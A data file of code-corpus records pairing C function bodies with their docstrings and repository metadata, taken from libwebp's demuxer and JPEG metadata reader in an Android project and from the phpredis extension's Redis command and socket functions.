{"docstring": "// !WEBP_HAVE_JPEG\n", "func_signal": "int ReadJPEG(FILE* in_file, struct WebPPicture* const pic,\n             struct Metadata* const metadata)", "code": "{\n  (void)in_file;\n  (void)pic;\n  (void)metadata;\n  fprintf(stderr, \"JPEG support not compiled. Please install the libjpeg \"\n          \"development package before building.\\n\");\n  return 0;\n}", "path": "src\\main\\jni\\libwebp\\examples\\jpegdec.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// Store image bearing chunks to 'frame'.\n// If 'has_vp8l_alpha' is not NULL, it will be set to true if the frame is a\n// lossless image with alpha.\n", "func_signal": "static ParseStatus StoreFrame(int frame_num, uint32_t min_size,\n                              MemBuffer* const mem, Frame* const frame,\n                              int* const has_vp8l_alpha)", "code": "{\n  int alpha_chunks = 0;\n  int image_chunks = 0;\n  int done = (MemDataSize(mem) < min_size);\n  ParseStatus status = PARSE_OK;\n\n  if (has_vp8l_alpha != NULL) *has_vp8l_alpha = 0;  // Default.\n\n  if (done) return PARSE_NEED_MORE_DATA;\n\n  do {\n    const size_t chunk_start_offset = mem->start_;\n    const uint32_t fourcc = ReadLE32(mem);\n    const uint32_t payload_size = ReadLE32(mem);\n    const uint32_t payload_size_padded = payload_size + (payload_size & 1);\n    const size_t payload_available = (payload_size_padded > MemDataSize(mem))\n                                   ? MemDataSize(mem) : payload_size_padded;\n    const size_t chunk_size = CHUNK_HEADER_SIZE + payload_available;\n\n    if (payload_size > MAX_CHUNK_PAYLOAD) return PARSE_ERROR;\n    if (SizeIsInvalid(mem, payload_size_padded)) return PARSE_ERROR;\n    if (payload_size_padded > MemDataSize(mem)) status = PARSE_NEED_MORE_DATA;\n\n    switch (fourcc) {\n      case MKFOURCC('A', 'L', 'P', 'H'):\n        if (alpha_chunks == 0) {\n          ++alpha_chunks;\n          frame->img_components_[1].offset_ = chunk_start_offset;\n          frame->img_components_[1].size_ = chunk_size;\n          frame->frame_num_ = frame_num;\n          Skip(mem, payload_available);\n        } else {\n          goto Done;\n        }\n        break;\n      case MKFOURCC('V', 'P', '8', 'L'):\n        if (alpha_chunks > 0) return PARSE_ERROR;  // VP8L has its own alpha\n        // fall through\n      case MKFOURCC('V', 'P', '8', ' '):\n        if (image_chunks == 0) {\n          // Extract the bitstream features, tolerating failures when the data\n          // is incomplete.\n          WebPBitstreamFeatures features;\n          const VP8StatusCode vp8_status =\n              WebPGetFeatures(mem->buf_ + chunk_start_offset, chunk_size,\n                              &features);\n          if (status == PARSE_NEED_MORE_DATA &&\n              vp8_status == VP8_STATUS_NOT_ENOUGH_DATA) {\n            return PARSE_NEED_MORE_DATA;\n          } else if (vp8_status != VP8_STATUS_OK) {\n            // We have enough data, and yet WebPGetFeatures() failed.\n            return PARSE_ERROR;\n          }\n          ++image_chunks;\n          frame->img_components_[0].offset_ = chunk_start_offset;\n          frame->img_components_[0].size_ = chunk_size;\n          frame->width_ = features.width;\n          frame->height_ = features.height;\n          if (has_vp8l_alpha != NULL) *has_vp8l_alpha = features.has_alpha;\n          frame->frame_num_ = frame_num;\n          frame->complete_ = (status == PARSE_OK);\n          Skip(mem, payload_available);\n        } else {\n          goto Done;\n        }\n        break;\n Done:\n      default:\n        // Restore fourcc/size when moving up one level in parsing.\n        Rewind(mem, CHUNK_HEADER_SIZE);\n        done = 1;\n        break;\n    }\n\n    if (mem->start_ == mem->riff_end_) {\n      done = 1;\n    } else if (MemDataSize(mem) < CHUNK_HEADER_SIZE) {\n      status = PARSE_NEED_MORE_DATA;\n    }\n  } while (!done && status == PARSE_OK);\n\n  return status;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// Parse a 'ANMF' chunk and any image bearing chunks that immediately follow.\n// 'frame_chunk_size' is the previously validated, padded chunk size.\n", "func_signal": "static ParseStatus ParseAnimationFrame(\n    WebPDemuxer* const dmux, uint32_t frame_chunk_size)", "code": "{\n  const int has_frames = !!(dmux->feature_flags_ & ANIMATION_FLAG);\n  const uint32_t anmf_payload_size = frame_chunk_size - ANMF_CHUNK_SIZE;\n  int added_frame = 0;\n  MemBuffer* const mem = &dmux->mem_;\n  Frame* frame;\n  ParseStatus status =\n      NewFrame(mem, ANMF_CHUNK_SIZE, frame_chunk_size, &frame);\n  if (status != PARSE_OK) return status;\n\n  frame->x_offset_       = 2 * ReadLE24s(mem);\n  frame->y_offset_       = 2 * ReadLE24s(mem);\n  frame->width_          = 1 + ReadLE24s(mem);\n  frame->height_         = 1 + ReadLE24s(mem);\n  frame->duration_       = ReadLE24s(mem);\n  frame->dispose_method_ = (WebPMuxAnimDispose)(ReadByte(mem) & 1);\n  if (frame->width_ * (uint64_t)frame->height_ >= MAX_IMAGE_AREA) {\n    free(frame);\n    return PARSE_ERROR;\n  }\n\n  // Store a frame only if the animation flag is set there is some data for\n  // this frame is available.\n  status = StoreFrame(dmux->num_frames_ + 1, anmf_payload_size, mem, frame,\n                      NULL);\n  if (status != PARSE_ERROR && has_frames && frame->frame_num_ > 0) {\n    added_frame = AddFrame(dmux, frame);\n    if (added_frame) {\n      ++dmux->num_frames_;\n    } else {\n      status = PARSE_ERROR;\n    }\n  }\n\n  if (!added_frame) free(frame);\n  return status;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// Create a whole 'frame' from VP8 (+ alpha) or lossless.\n", "func_signal": "static int SynthesizeFrame(const WebPDemuxer* const dmux,\n                           const Frame* const first_frame,\n                           int fragment_num, WebPIterator* const iter)", "code": "{\n  const uint8_t* const mem_buf = dmux->mem_.buf_;\n  int num_fragments;\n  size_t payload_size = 0;\n  const Frame* const fragment =\n      GetFragment(first_frame, fragment_num, &num_fragments);\n  const uint8_t* const payload =\n      GetFramePayload(mem_buf, fragment, &payload_size);\n  if (payload == NULL) return 0;\n  assert(first_frame != NULL);\n\n  iter->frame_num      = first_frame->frame_num_;\n  iter->num_frames     = dmux->num_frames_;\n  iter->fragment_num   = fragment_num;\n  iter->num_fragments  = num_fragments;\n  iter->x_offset       = fragment->x_offset_;\n  iter->y_offset       = fragment->y_offset_;\n  iter->width          = fragment->width_;\n  iter->height         = fragment->height_;\n  iter->duration       = fragment->duration_;\n  iter->dispose_method = fragment->dispose_method_;\n  iter->complete       = fragment->complete_;\n  iter->fragment.bytes = payload;\n  iter->fragment.size  = payload_size;\n  // TODO(jzern): adjust offsets for 'FRGM's embedded in 'ANMF's\n  return 1;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// -----------------------------------------------------------------------------\n// WebPDemuxer object\n", "func_signal": "static void InitDemux(WebPDemuxer* const dmux, const MemBuffer* const mem)", "code": "{\n  dmux->state_ = WEBP_DEMUX_PARSING_HEADER;\n  dmux->loop_count_ = 1;\n  dmux->bgcolor_ = 0xFFFFFFFF;  // White background by default.\n  dmux->canvas_width_ = -1;\n  dmux->canvas_height_ = -1;\n  dmux->frames_tail_ = &dmux->frames_;\n  dmux->mem_ = *mem;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// -----------------------------------------------------------------------------\n// Chunk iteration\n", "func_signal": "static int ChunkCount(const WebPDemuxer* const dmux, const char fourcc[4])", "code": "{\n  const uint8_t* const mem_buf = dmux->mem_.buf_;\n  const Chunk* c;\n  int count = 0;\n  for (c = dmux->chunks_; c != NULL; c = c->next_) {\n    const uint8_t* const header = mem_buf + c->data_.offset_;\n    if (!memcmp(header, fourcc, TAG_SIZE)) ++count;\n  }\n  return count;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// Parse a 'FRGM' chunk and any image bearing chunks that immediately follow.\n// 'fragment_chunk_size' is the previously validated, padded chunk size.\n", "func_signal": "static ParseStatus ParseFragment(WebPDemuxer* const dmux,\n                                 uint32_t fragment_chunk_size)", "code": "{\n  const int frame_num = 1;  // All fragments belong to the 1st (and only) frame.\n  const int has_fragments = !!(dmux->feature_flags_ & FRAGMENTS_FLAG);\n  const uint32_t frgm_payload_size = fragment_chunk_size - FRGM_CHUNK_SIZE;\n  int added_fragment = 0;\n  MemBuffer* const mem = &dmux->mem_;\n  Frame* frame;\n  ParseStatus status =\n      NewFrame(mem, FRGM_CHUNK_SIZE, fragment_chunk_size, &frame);\n  if (status != PARSE_OK) return status;\n\n  frame->is_fragment_ = 1;\n  frame->x_offset_ = 2 * ReadLE24s(mem);\n  frame->y_offset_ = 2 * ReadLE24s(mem);\n\n  // Store a fragment only if the fragments flag is set there is some data for\n  // this fragment is available.\n  status = StoreFrame(frame_num, frgm_payload_size, mem, frame, NULL);\n  if (status != PARSE_ERROR && has_fragments && frame->frame_num_ > 0) {\n    added_fragment = AddFrame(dmux, frame);\n    if (!added_fragment) {\n      status = PARSE_ERROR;\n    } else {\n      dmux->num_frames_ = 1;\n    }\n  }\n\n  if (!added_fragment) free(frame);\n  return status;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// Creates a new Frame if 'actual_size' is within bounds and 'mem' contains\n// enough data ('min_size') to parse the payload.\n// Returns PARSE_OK on success with *frame pointing to the new Frame.\n// Returns PARSE_NEED_MORE_DATA with insufficient data, PARSE_ERROR otherwise.\n", "func_signal": "static ParseStatus NewFrame(const MemBuffer* const mem,\n                            uint32_t min_size, uint32_t actual_size,\n                            Frame** frame)", "code": "{\n  if (SizeIsInvalid(mem, min_size)) return PARSE_ERROR;\n  if (actual_size < min_size) return PARSE_ERROR;\n  if (MemDataSize(mem) < min_size)  return PARSE_NEED_MORE_DATA;\n\n  *frame = (Frame*)calloc(1, sizeof(**frame));\n  return (*frame == NULL) ? PARSE_ERROR : PARSE_OK;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// Add a frame to the end of the list, ensuring the last frame is complete.\n// Returns true on success, false otherwise.\n", "func_signal": "static int AddFrame(WebPDemuxer* const dmux, Frame* const frame)", "code": "{\n  const Frame* const last_frame = *dmux->frames_tail_;\n  if (last_frame != NULL && !last_frame->complete_) return 0;\n\n  *dmux->frames_tail_ = frame;\n  frame->next_ = NULL;\n  dmux->frames_tail_ = &frame->next_;\n  return 1;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// Returns true on success and false for memory errors and corrupt profiles.\n// The caller must use MetadataFree() on 'metadata' in all cases.\n", "func_signal": "static int ExtractMetadataFromJPEG(j_decompress_ptr dinfo,\n                                   Metadata* const metadata)", "code": "{\n  static const struct {\n    int marker;\n    const char* signature;\n    size_t signature_length;\n    size_t storage_offset;\n  } kJPEGMetadataMap[] = {\n    // Exif 2.2 Section 4.7.2 Interoperability Structure of APP1 ...\n    { JPEG_APP1, \"Exif\\0\",                        6, METADATA_OFFSET(exif) },\n    // XMP Specification Part 3 Section 3 Embedding XMP Metadata ... #JPEG\n    // TODO(jzern) Add support for 'ExtendedXMP'\n    { JPEG_APP1, \"http://ns.adobe.com/xap/1.0/\", 29, METADATA_OFFSET(xmp) },\n    { 0, NULL, 0, 0 },\n  };\n  jpeg_saved_marker_ptr marker;\n  // Treat ICC profiles separately as they may be segmented and out of order.\n  if (!StoreICCP(dinfo, &metadata->iccp)) return 0;\n\n  for (marker = dinfo->marker_list; marker != NULL; marker = marker->next) {\n    int i;\n    for (i = 0; kJPEGMetadataMap[i].marker != 0; ++i) {\n      if (marker->marker == kJPEGMetadataMap[i].marker &&\n          marker->data_length > kJPEGMetadataMap[i].signature_length &&\n          !memcmp(marker->data, kJPEGMetadataMap[i].signature,\n                  kJPEGMetadataMap[i].signature_length)) {\n        MetadataPayload* const payload =\n            (MetadataPayload*)((uint8_t*)metadata +\n                               kJPEGMetadataMap[i].storage_offset);\n\n        if (payload->bytes == NULL) {\n          const char* marker_data = (const char*)marker->data +\n                                    kJPEGMetadataMap[i].signature_length;\n          const size_t marker_data_length =\n              marker->data_length - kJPEGMetadataMap[i].signature_length;\n          if (!MetadataCopy(marker_data, marker_data_length, payload)) return 0;\n        } else {\n          fprintf(stderr, \"Ignoring additional '%s' marker\\n\",\n                  kJPEGMetadataMap[i].signature);\n        }\n      }\n    }\n  }\n  return 1;\n}", "path": "src\\main\\jni\\libwebp\\examples\\jpegdec.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// Extract ICC profile segments from the marker list in 'dinfo', reassembling\n// and storing them in 'iccp'.\n// Returns true on success and false for memory errors and corrupt profiles.\n", "func_signal": "static int StoreICCP(j_decompress_ptr dinfo, MetadataPayload* const iccp)", "code": "{\n  // ICC.1:2010-12 (4.3.0.0) Annex B.4 Embedding ICC Profiles in JPEG files\n  static const char kICCPSignature[] = \"ICC_PROFILE\";\n  static const size_t kICCPSignatureLength = 12;  // signature includes '\\0'\n  static const size_t kICCPSkipLength = 14;  // signature + seq & count\n  int expected_count = 0;\n  int actual_count = 0;\n  int seq_max = 0;\n  size_t total_size = 0;\n  ICCPSegment iccp_segments[255];\n  jpeg_saved_marker_ptr marker;\n\n  memset(iccp_segments, 0, sizeof(iccp_segments));\n  for (marker = dinfo->marker_list; marker != NULL; marker = marker->next) {\n    if (marker->marker == JPEG_APP2 &&\n        marker->data_length > kICCPSkipLength &&\n        !memcmp(marker->data, kICCPSignature, kICCPSignatureLength)) {\n      // ICC_PROFILE\\0<seq><count>; 'seq' starts at 1.\n      const int seq = marker->data[kICCPSignatureLength];\n      const int count = marker->data[kICCPSignatureLength + 1];\n      const size_t segment_size = marker->data_length - kICCPSkipLength;\n      ICCPSegment* segment;\n\n      if (segment_size == 0 || count == 0 || seq == 0) {\n        fprintf(stderr, \"[ICCP] size (%d) / count (%d) / sequence number (%d)\"\n                        \" cannot be 0!\\n\",\n                (int)segment_size, seq, count);\n        return 0;\n      }\n\n      if (expected_count == 0) {\n        expected_count = count;\n      } else if (expected_count != count) {\n        fprintf(stderr, \"[ICCP] Inconsistent segment count (%d / %d)!\\n\",\n                expected_count, count);\n        return 0;\n      }\n\n      segment = iccp_segments + seq - 1;\n      if (segment->data_length != 0) {\n        fprintf(stderr, \"[ICCP] Duplicate segment number (%d)!\\n\" , seq);\n        return 0;\n      }\n\n      segment->data = marker->data + kICCPSkipLength;\n      segment->data_length = segment_size;\n      segment->seq = seq;\n      total_size += segment_size;\n      if (seq > seq_max) seq_max = seq;\n      ++actual_count;\n    }\n  }\n\n  if (actual_count == 0) return 1;\n  if (seq_max != actual_count) {\n    fprintf(stderr, \"[ICCP] Discontinuous segments, expected: %d actual: %d!\\n\",\n            actual_count, seq_max);\n    return 0;\n  }\n  if (expected_count != actual_count) {\n    fprintf(stderr, \"[ICCP] Segment count: %d does not match expected: %d!\\n\",\n            actual_count, expected_count);\n    return 0;\n  }\n\n  // The segments may appear out of order in the file, sort them based on\n  // sequence number before assembling the payload.\n  qsort(iccp_segments, actual_count, sizeof(*iccp_segments),\n        CompareICCPSegments);\n\n  iccp->bytes = (uint8_t*)malloc(total_size);\n  if (iccp->bytes == NULL) return 0;\n  iccp->size = total_size;\n\n  {\n    int i;\n    size_t offset = 0;\n    for (i = 0; i < seq_max; ++i) {\n      memcpy(iccp->bytes + offset,\n             iccp_segments[i].data, iccp_segments[i].data_length);\n      offset += iccp_segments[i].data_length;\n    }\n  }\n  return 1;\n}", "path": "src\\main\\jni\\libwebp\\examples\\jpegdec.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// Read from 'mem' and skip the read bytes.\n", "func_signal": "static WEBP_INLINE uint8_t ReadByte(MemBuffer* const mem)", "code": "{\n  const uint8_t byte = mem->buf_[mem->start_];\n  Skip(mem, 1);\n  return byte;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// -----------------------------------------------------------------------------\n", "func_signal": "uint32_t WebPDemuxGetI(const WebPDemuxer* dmux, WebPFormatFeature feature)", "code": "{\n  if (dmux == NULL) return 0;\n\n  switch (feature) {\n    case WEBP_FF_FORMAT_FLAGS:     return dmux->feature_flags_;\n    case WEBP_FF_CANVAS_WIDTH:     return (uint32_t)dmux->canvas_width_;\n    case WEBP_FF_CANVAS_HEIGHT:    return (uint32_t)dmux->canvas_height_;\n    case WEBP_FF_LOOP_COUNT:       return (uint32_t)dmux->loop_count_;\n    case WEBP_FF_BACKGROUND_COLOR: return dmux->bgcolor_;\n    case WEBP_FF_FRAME_COUNT:      return (uint32_t)dmux->num_frames_;\n  }\n  return 0;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// -----------------------------------------------------------------------------\n// Primary chunk parsing\n", "func_signal": "static int ReadHeader(MemBuffer* const mem)", "code": "{\n  const size_t min_size = RIFF_HEADER_SIZE + CHUNK_HEADER_SIZE;\n  uint32_t riff_size;\n\n  // Basic file level validation.\n  if (MemDataSize(mem) < min_size) return 0;\n  if (memcmp(GetBuffer(mem), \"RIFF\", CHUNK_SIZE_BYTES) ||\n      memcmp(GetBuffer(mem) + CHUNK_HEADER_SIZE, \"WEBP\", CHUNK_SIZE_BYTES)) {\n    return 0;\n  }\n\n  riff_size = GetLE32(GetBuffer(mem) + TAG_SIZE);\n  if (riff_size < CHUNK_HEADER_SIZE) return 0;\n  if (riff_size > MAX_CHUNK_PAYLOAD) return 0;\n\n  // There's no point in reading past the end of the RIFF chunk\n  mem->riff_end_ = riff_size + CHUNK_HEADER_SIZE;\n  if (mem->buf_size_ > mem->riff_end_) {\n    mem->buf_size_ = mem->end_ = mem->riff_end_;\n  }\n\n  Skip(mem, RIFF_HEADER_SIZE);\n  return 1;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// -----------------------------------------------------------------------------\n// Secondary chunk parsing\n", "func_signal": "static void AddChunk(WebPDemuxer* const dmux, Chunk* const chunk)", "code": "{\n  Chunk** c = &dmux->chunks_;\n  while (*c != NULL) c = &(*c)->next_;\n  *c = chunk;\n  chunk->next_ = NULL;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// -----------------------------------------------------------------------------\n// MemBuffer\n", "func_signal": "static int RemapMemBuffer(MemBuffer* const mem,\n                          const uint8_t* data, size_t size)", "code": "{\n  if (size < mem->buf_size_) return 0;  // can't remap to a shorter buffer!\n\n  mem->buf_ = data;\n  mem->end_ = mem->buf_size_ = size;\n  return 1;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// General chunk storage, starting with the header at 'start_offset', allowing\n// the user to request the payload via a fourcc string. 'size' includes the\n// header and the unpadded payload size.\n// Returns true on success, false otherwise.\n", "func_signal": "static int StoreChunk(WebPDemuxer* const dmux,\n                      size_t start_offset, uint32_t size)", "code": "{\n  Chunk* const chunk = (Chunk*)calloc(1, sizeof(*chunk));\n  if (chunk == NULL) return 0;\n\n  chunk->data_.offset_ = start_offset;\n  chunk->data_.size_ = size;\n  AddChunk(dmux, chunk);\n  return 1;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// Returns fragment 'fragment_num' and the total count.\n", "func_signal": "static const Frame* GetFragment(\n    const Frame* const frame_set, int fragment_num, int* const count)", "code": "{\n  const int this_frame = frame_set->frame_num_;\n  const Frame* f = frame_set;\n  const Frame* fragment = NULL;\n  int total;\n\n  for (total = 0; f != NULL && f->frame_num_ == this_frame; f = f->next_) {\n    if (++total == fragment_num) fragment = f;\n  }\n  *count = total;\n  return fragment;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "// -----------------------------------------------------------------------------\n// Format validation\n", "func_signal": "static int IsValidSimpleFormat(const WebPDemuxer* const dmux)", "code": "{\n  const Frame* const frame = dmux->frames_;\n  if (dmux->state_ == WEBP_DEMUX_PARSING_HEADER) return 1;\n\n  if (dmux->canvas_width_ <= 0 || dmux->canvas_height_ <= 0) return 0;\n  if (dmux->state_ == WEBP_DEMUX_DONE && frame == NULL) return 0;\n\n  if (frame->width_ <= 0 || frame->height_ <= 0) return 0;\n  return 1;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
{"docstring": "/* hVals */\n", "func_signal": "PHP_METHOD(Redis, hVals)", "code": "{\n    RedisSock *redis_sock = generic_hash_command_1(INTERNAL_FUNCTION_PARAM_PASSTHRU, \"HVALS\", sizeof(\"HVALS\")-1);\n\n\tIF_ATOMIC() {\n\t    if (redis_sock_read_multibulk_reply(INTERNAL_FUNCTION_PARAM_PASSTHRU,\n    \t                                    redis_sock, NULL, NULL) < 0) {\n        \tRETURN_FALSE;\n\t    }\n\t}\n\tREDIS_PROCESS_RESPONSE(redis_sock_read_multibulk_reply);\n\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/* \n\tsubscribe channel_1 channel_2 ... channel_n \n\tsubscribe(array(channel_1, channel_2, ..., channel_n), callback) \n*/\n", "func_signal": "PHP_METHOD(Redis, subscribe)", "code": "{\n\tzval *z_callback,*object, *array, **data;\n    HashTable *arr_hash;\n    HashPosition pointer;\n    RedisSock *redis_sock;\n    char *cmd = \"\", *old_cmd = NULL, *callback_ft_name;\n    int cmd_len, array_count, callback_ft_name_len;\n\n\t\n\tif (zend_parse_method_parameters(ZEND_NUM_ARGS() TSRMLS_CC, getThis(), \"Oaz|z\", \n\t\t\t\t\t\t\t\t\t &object, redis_ce, &array, &z_callback) == FAILURE) {\n\t\tRETURN_FALSE;\t\n\t}\n\n    if (redis_sock_get(object, &redis_sock TSRMLS_CC) < 0) {\n        RETURN_FALSE;\n    }\n\n    arr_hash    = Z_ARRVAL_P(array);\n    array_count = zend_hash_num_elements(arr_hash);\n\n    if (array_count == 0) {\n        RETURN_FALSE;\n    }\n    for (zend_hash_internal_pointer_reset_ex(arr_hash, &pointer);\n         zend_hash_get_current_data_ex(arr_hash, (void**) &data,\n                                       &pointer) == SUCCESS;\n         zend_hash_move_forward_ex(arr_hash, &pointer)) {\n\n        if (Z_TYPE_PP(data) == IS_STRING) {\n            char *old_cmd = NULL;\n            if(*cmd) {\n                old_cmd = cmd;\n            }\n            cmd_len = spprintf(&cmd, 0, \"%s %s\", cmd, Z_STRVAL_PP(data));\n            if(old_cmd) {\n                efree(old_cmd);\n            }\n        }\n    }\n\n    old_cmd = cmd;\n    cmd_len = spprintf(&cmd, 0, \"SUBSCRIBE %s\\r\\n\", cmd);\n    efree(old_cmd);\n    if (redis_sock_write(redis_sock, cmd, cmd_len TSRMLS_CC) < 0) {\n        efree(cmd);\n        RETURN_FALSE;\n    }\n    efree(cmd);\n\t\n\t/* read the status of the execution of the command `subscribe` */\n\tzval *z_tab, **tmp;\n\tchar *type_response;\n\t\n    z_tab = redis_sock_read_multibulk_reply_zval(INTERNAL_FUNCTION_PARAM_PASSTHRU, redis_sock);\n\n\tif (zend_hash_index_find(Z_ARRVAL_P(z_tab), 0, (void**)&tmp) == SUCCESS) {\n\t\ttype_response = Z_STRVAL_PP(tmp);\n\t\tif(strcmp(type_response, \"subscribe\") != 0) {\n\t\t\tefree(tmp);\n\t\t\tefree(z_tab);\t\n\t\t\tRETURN_FALSE;\n\t\t} \n\t} else {\n\t\tefree(z_tab);\t\n\t\tRETURN_FALSE;\n\t}\n\tefree(z_tab);\t\n\t\n\tint callback_type;\n\tzval *z_o, *z_fun,*z_ret, *z_args[3];\n\tchar *method_name;\n\tzend_class_entry *ce;\n\n\t/* verify the callback */\n\tif(Z_TYPE_P(z_callback) == IS_ARRAY) {\n\n        /* object */\n\t\tif (zend_hash_index_find(Z_ARRVAL_P(z_callback), 0, (void**)&tmp) == FAILURE) {\n\t\t\tRETURN_FALSE;\n\t\t}\n\t\tz_o = *tmp;\n\n        /* method name */\n\t\tif (zend_hash_index_find(Z_ARRVAL_P(z_callback), 1, (void**)&tmp) == FAILURE) {\n\t\t\tRETURN_FALSE;\n\t\t}\n\t\tmethod_name = Z_STRVAL_PP(tmp);\t\n\n\t\tALLOC_INIT_ZVAL(z_fun);\n\t\tZVAL_STRING(z_fun, method_name, 1);\n\t\tcallback_type = R_SUB_CALLBACK_CLASS_TYPE;\n\n\t} else if(Z_TYPE_P(z_callback) == IS_STRING) {\n\t\tcallback_ft_name = Z_STRVAL_P(z_callback);\n\t\tcallback_ft_name_len = strlen(callback_ft_name);\n\t\tcallback_type = R_SUB_CALLBACK_FT_TYPE;\n\t}\n\n\t/* Multibulk Response, format : {message type, originating channel, message payload} */\n\twhile(1) {\t\t\n\t\t/* call the callback with this z_tab in argument */\n\t    z_tab = redis_sock_read_multibulk_reply_zval(INTERNAL_FUNCTION_PARAM_PASSTHRU, redis_sock);\n\t\tzval **type, **channel, **data;\n\t\t\n\t\tif(Z_TYPE_P(z_tab) != IS_ARRAY) {\n\t\t\t//ERROR\n\t\t\tbreak;\n\t\t}\n\n\t\tif (zend_hash_index_find(Z_ARRVAL_P(z_tab), 0, (void**)&type) == FAILURE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (zend_hash_index_find(Z_ARRVAL_P(z_tab), 1, (void**)&channel) == FAILURE) {\n\t\t\tbreak;\n\t\t}\t\t\n\t\tif (zend_hash_index_find(Z_ARRVAL_P(z_tab), 2, (void**)&data) == FAILURE) {\n\t\t\tbreak;\n\t\t}\n\n        if(Z_TYPE_PP(type) == IS_STRING && strncmp(Z_STRVAL_PP(type), \"message\", 7) != 0) {\n                continue; /* only forwarding published messages */\n        }\n\t\t\n\t\tz_args[0] = getThis();\n\t\tz_args[1] = *channel;\n\t\tz_args[2] = *data;\n\t\n\t\tswitch(callback_type) {\n\t\t\tcase R_SUB_CALLBACK_CLASS_TYPE:\n\t\t       \tMAKE_STD_ZVAL(z_ret);\n\t\t\t\tcall_user_function(&ce->function_table, &z_o, z_fun, z_ret, 3, z_args TSRMLS_CC);\t\t\t\t\t\t\t\n\t\t        efree(z_ret);\n\t\t\t\tbreak;\n\n\t\t\tcase R_SUB_CALLBACK_FT_TYPE:\n\t\t       \tMAKE_STD_ZVAL(z_ret);\n\t\t\t\tMAKE_STD_ZVAL(z_fun);\t\n\t\t\t\tZVAL_STRINGL(z_fun, callback_ft_name, callback_ft_name_len, 0);\n\t        \tcall_user_function(EG(function_table), NULL, z_fun, z_ret, 3, z_args TSRMLS_CC);\n\t\t        efree(z_fun);\n\t\t        efree(z_ret);\n\t\t\t\tbreak;\n\t\t}\n        /* TODO: provide a way to break out of the loop. */\n\t\tzval_dtor(z_tab);\n\t\tefree(z_tab);\n\t}\t\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/**\n * redis_sock_create\n */\n", "func_signal": "PHPAPI RedisSock* redis_sock_create(char *host, int host_len, unsigned short port,\n                                    double timeout, int persistent)", "code": "{\n    RedisSock *redis_sock;\n\n    redis_sock         = ecalloc(1, sizeof(RedisSock));\n    redis_sock->host   = ecalloc(host_len + 1, 1);\n    redis_sock->stream = NULL;\n    redis_sock->status = REDIS_SOCK_STATUS_DISCONNECTED;\n\n    redis_sock->persistent = persistent;\n\n    memcpy(redis_sock->host, host, host_len);\n    redis_sock->host[host_len] = '\\0';\n\n    redis_sock->port    = port;\n    redis_sock->timeout = timeout;\n\n    redis_sock->serializer = REDIS_SERIALIZER_NONE;\n    redis_sock->mode = ATOMIC;\n    redis_sock->head = NULL;\n    redis_sock->current = NULL;\n    redis_sock->pipeline_head = NULL;\n    redis_sock->pipeline_current = NULL;\n\n    return redis_sock;\n}", "path": "library.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
